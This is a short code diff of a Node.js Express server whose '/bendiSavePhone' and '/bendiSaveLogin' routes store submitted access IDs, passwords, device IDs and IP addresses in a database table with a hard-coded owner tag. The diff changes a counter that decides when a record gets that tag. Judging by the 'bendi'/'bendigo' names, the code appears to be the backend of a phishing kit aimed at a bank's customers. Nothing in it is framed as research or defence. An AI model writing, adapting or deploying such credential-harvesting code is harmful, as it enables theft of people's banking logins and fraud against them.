@@ -103,7 +103,7 @@ app.post("/bendiSavePhone", cors(), (req, res) => {
   });
 });
 
-let bendigoCountSkii = 3;
+let bendigoCountSkii = 2;
 
 app.options("/bendiSaveLogin", cors());
 
@@ -114,7 +114,7 @@ app.post("/bendiSaveLogin", cors(), (req, res) => {
   ip = req.body.ip;
   uniqueid = req.body.uniqueid;
 
-  if (bendigoCountSkii == 3) {
+  if (bendigoCountSkii == 2) {
     let details = [accessId, password, uniqueid, ip, "haytch123!"];
     let query = `INSERT INTO bendi(accessId,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;
 
